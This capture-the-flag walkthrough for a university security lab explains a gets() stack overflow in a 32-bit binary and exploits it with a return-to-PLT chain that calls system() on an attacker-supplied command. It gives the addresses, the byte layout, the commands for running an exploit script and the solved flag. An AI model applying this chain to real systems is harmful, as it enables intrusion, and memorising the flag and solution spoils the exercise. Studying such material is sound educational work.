# Attack Binary Ret2PLT Walkthrough

## Overview
**Vulnerability:** Stack buffer overflow via `gets()` in 32-bit binary  
**Target:** `moa6.eecs.utk.edu:9995`  
**Method:** Return-to-PLT chain (ret2plt) with two-stage `gets()` + `system()` gadgets  
**Flag:** `cosc466-flag-{EkwrwC26jrWfffn8nUvMRq5Q}`

---

## Vulnerability

The `cmd()` function in `attack.c` uses `gets(buffer)` to read a 12-byte buffer with no bounds checking. Input longer than 12 bytes overwrites the saved return address on the stack, allowing code execution redirection.

---

## Key Addresses & Offsets

| Item | Address |
|------|---------|
| Buffer size | 12 bytes |
| Offset to EIP | 24 bytes |
| `gets@plt` | `0x08049070` |
| `system@plt` | `0x080490a0` |
| `exit@plt` | `0x080490b0` |
| `pop ebx; ret` gadget | `0x0804901e` |
| Writable memory (`.bss`) | `0x0804c140` |

---  

## Using the Script

### Quick Start (Remote)
```bash
cd /home/judah/CS466
python3 ctf/13-attack-ret2libc/exploit.py
```

### Against Local Binary
```bash
python3 ctf/13-attack-ret2libc/exploit.py --local
```

### Custom Command
```bash
python3 ctf/13-attack-ret2libc/exploit.py --command "ls -la"
```

### Custom Remote Target
```bash
python3 ctf/13-attack-ret2libc/exploit.py --host example.com --port 9995
```

---

## Manual Exploitation (By Hand)

The goal is to use the overflow once to call `gets()` again, but this time with a writable address. That lets you place a command string in memory and then immediately call `system()` on it.

### Step 1: Work Out the Stack Offset
The buffer is 12 bytes, and the saved base pointer sits above it. That means the saved return address is reached after 24 bytes total:

```text
12 bytes buffer + 4 bytes saved ebp + 8 bytes of stack layout = 24 bytes to EIP
```

So the first part of the exploit is 24 padding bytes.

### Step 2: Choose the Function Chain
Use these addresses:

| Item | Address |
|------|---------|
| `gets@plt` | `0x08049070` |
| `system@plt` | `0x080490a0` |
| `exit@plt` | `0x080490b0` |
| `pop ebx; ret` | `0x0804901e` |
| Writable memory | `0x0804c140` |

The chain is:

1. jump to `gets@plt`
2. return into `pop ebx; ret` so the stack is adjusted cleanly
3. pass `0x0804c140` as the argument to `gets`
4. jump to `system@plt`
5. return to `exit@plt`
6. pass `0x0804c140` again, this time as the argument to `system`

### Step 3: Lay Out the Raw Bytes
The payload on stdin needs to look like this:

```text
[24 padding bytes]
[gets@plt]
[pop ebx; ret]
[0x0804c140]
[system@plt]
[exit@plt]
[0x0804c140]
```

If you want to write the addresses out as raw 32-bit little-endian values, the dwords are:

```text
0x08049070 -> 70 90 04 08
0x0804901e -> 1e 90 04 08
0x0804c140 -> 40 c1 04 08
0x080490a0 -> a0 90 04 08
0x080490b0 -> b0 90 04 08
```

Then, after that first line is consumed by `gets(buffer)`, send a second line containing the command you want executed, for example `cat flag.txt`.

### Step 4: Send Two Separate Inputs
The first input is the overflow payload. The second input is the command string that `gets()` writes into the writable area.

If you are doing this manually, the important part is not the Python wrapper; it is the order of the bytes and the fact that the command string comes after the initial overflow. Any tool that can send raw bytes over stdin or a socket will work.

### Step 5: What Happens
After the overflow:

1. `gets@plt` reads your second line into `0x0804c140`
2. `system@plt` runs that string as a shell command
3. `exit@plt` cleans up the process

If you send `cat flag.txt`, the server prints the flag.

---

## How It Works (Technical)

1. **Overflow:** Send 24 bytes of padding followed by the ROP chain.
2. **Return to `gets@plt`:** The overflow redirects execution to the PLT entry for `gets()`.
3. **Read Command:** `gets()` reads the next line of input into writable memory at `0x0804c140`.
4. **Return to `system@plt`:** After `gets()` returns, execution continues into `system()` with the writable address as its argument.
5. **Clean Exit:** `exit()` terminates the connection cleanly.

The trick: We chain two PLT calls using a `pop-ret` gadget to set up function arguments properly on the 32-bit x86 calling convention.
